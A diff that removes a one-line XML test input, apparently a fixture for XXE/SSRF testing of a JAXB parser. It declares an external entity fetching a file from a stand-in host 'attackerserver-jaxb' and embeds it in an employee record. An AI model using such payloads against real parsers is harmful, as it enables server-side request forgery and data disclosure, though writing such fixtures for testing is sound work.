@@ -1,1 +1,0 @@
-<!DOCTYPE root [ <!ENTITY lastname SYSTEM "http://attackerserver-jaxb:8888/ssrf/singleline.txt" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
